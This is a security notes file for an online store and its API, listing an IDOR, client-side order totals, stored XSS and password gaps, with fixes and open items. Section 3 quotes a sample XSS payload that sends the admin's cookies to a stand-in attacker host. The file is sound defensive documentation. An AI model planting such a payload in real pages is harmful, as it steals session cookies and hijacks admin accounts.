# Security notes — OJ || studios

This file records the security issues found across the storefront and its API
(`backendroutes-lcpt.onrender.com`, a separate repository), what has been
fixed, and what is still outstanding.

Item 1 (authentication) is now done on both sides. Item 2 (order totals) is
the remaining critical one.

---

## 1. Token authentication ✅ FIXED

**Status: DONE — backend and frontend.**

Routes used to identify the caller by a `userId` in the request body. A user
id is an identifier, not a secret, so anyone could send any id and read another
customer's cart, orders or saved address (an IDOR). `verifyAdmin` did check
`is_admin` in the database, but the id it checked was whatever the caller
typed — and ids are sequential, so guessing an admin's id granted the whole
admin portal.

### What changed on the server

`/loginoj` and `/admin/login` now return a signed JWT alongside the existing
fields. `requireAuth` verifies the bearer token and populates `req.user` from
the payload; every protected route takes the user id from there and ignores
the body value. `requireAdmin` adds a database re-check of `is_admin` on every
call, so revoking admin takes effect immediately rather than at token expiry.

Protected: `/cartoj`, `/ojcartget`, `/ojcartrmv`, `/verify-payment`,
`/ojuser`, `/ojuser/update`, `/ojuser/address`, `/ojuser/password`,
`/ojuser/delete`, `/ojorders`, `/ojorderitems`, `/ojtrack`, and all
`/admin/*` routes.

Still public, by design: `/ojmerch` (the catalogue), `/register`, `/loginoj`,
`/admin/login`, `/ojsub` (newsletter).

Two routes needed more than authentication, because they take an identifier
belonging to someone else:

- `/ojorderitems` took an `orderId` and returned its contents to anyone.
  It now confirms the order belongs to the caller.
- `/ojtrack` had an ownership check that only ran `if (userId)` — omitting
  the field skipped it entirely. It now always applies.

### Configuration

`JWT_SECRET` must be set in the environment. If it is missing the
authenticated OJ routes fail closed with 503 and log an error; the server does
not exit, because it also hosts unrelated projects.

Optional: `JWT_EXPIRES_IN` (default `7d`).

### Verified

The middleware was extracted and exercised against 13 cases, all passing:
requests with no token, malformed tokens, tokens signed with the wrong secret,
expired tokens, and `alg:none` forgeries are all rejected; a customer token is
refused on admin routes; a payload with a forged `role: "admin"` is still
refused because the database is re-checked; a token for a deleted user is
refused; and the public catalogue is unaffected.

### Frontend

No changes were needed — `OJ.Auth.setSession()` already picked up the `token`
field and `OJ.api()` already sent it as `Authorization: Bearer`.

Note that this invalidates existing sessions: anyone signed in before the
deploy gets a 401 on their next action, which the client handles by clearing
the session and asking them to sign in again.

## 2. Order totals are computed in the browser ⚠️ BACKEND REQUIRED

**Status: NOT FIXED (server-side by nature).**

The cart subtotal, the shipping cost, and the final total are all calculated in
`script.js` and handed to Paystack as the amount to charge. A user can edit
those values before paying.

### What the backend must do

In `/verify-payment`:

1. Re-read the user's cart **from the database**, not from `paymentData.cartItems`.
2. Recompute the subtotal from database prices, and the shipping cost from a
   server-side table keyed on `shipping_region`.
3. Call the Paystack verify API and compare the **actual amount captured**
   against the recomputed total.
4. Reject and refund on mismatch. Only create the order when they agree.

The frontend now also sends `shipping_region` and `shipping_cost` so the server
can check the client's arithmetic against its own.

---

## 3. Stored XSS into the admin dashboard ✅ FIXED

`admin.html` rendered customer names and emails into `innerHTML` unescaped.
A user could register with a name like `<img src=x onerror="fetch('//attacker/'+document.cookie)">`
and it would execute in the admin's browser, with the admin's session.

All backend-supplied values are now passed through `OJ.escapeHtml()` (and
`OJ.safeUrl()` for image sources, which also rejects `javascript:` URLs).
This applies to `admin.html`, `acc.html`, `signup.html`, `login.html`, and the
product/cart rendering in `script.js`.

**Defence in depth still worth adding:** validate name/email format on the
server at registration.

---

## 4. Password policy ✅ PARTLY FIXED

Signup had no password requirements at all — an empty-ish password was accepted
if the browser allowed it. The account page required only 6 characters.

Both now require **8 characters minimum**, enforced client-side with
`minlength` plus a JS check.

**The backend must enforce the same minimum** — client validation is a UX
convenience, not a control. Also confirm passwords are hashed with bcrypt/argon2
and never stored or logged in plaintext.

---

## 5. No password reset, no email verification ⚠️ BACKEND REQUIRED

**Status: NOT BUILT — needs backend endpoints first.**

There is currently no way for a customer who forgets their password to recover
their account, and email addresses are never verified.

Deliberately **not** stubbed in the UI: a "forgot password" link that goes
nowhere is worse than none. Once these endpoints exist, wire them up:

- `POST /request-password-reset` → emails a single-use, time-limited token
- `POST /reset-password` → consumes the token, sets the new password
- `POST /verify-email` → confirms ownership at signup

---

## 6. Public keys in source ✅ NOT A PROBLEM

`pk_live_...` (Paystack) and `9njw5PNNC3JuIC3ot` (EmailJS) are **publishable**
keys and are meant to be in client code.

Two caveats worth acting on:

- Confirm the Paystack **secret** key (`sk_live_...`) lives only in backend
  environment variables. It must never appear in this repo.
- Lock the EmailJS public key to your domain in the EmailJS dashboard, or
  anyone can send mail through your templates and burn your quota.

---

## Priority order

| # | Issue | Owner | Severity | Status |
|---|-------|-------|----------|--------|
| 2 | Server-side total verification | backend | **Critical** | open |
| 5 | Password reset / email verification | backend | High | open |
| 4 | Server-side password rules | backend | Medium | open |
| 6 | EmailJS domain lock | dashboard | Low | open |
| 1 | Token auth on all routes | backend | Critical | ✅ done |
| 3 | Admin XSS | frontend | High | ✅ done |
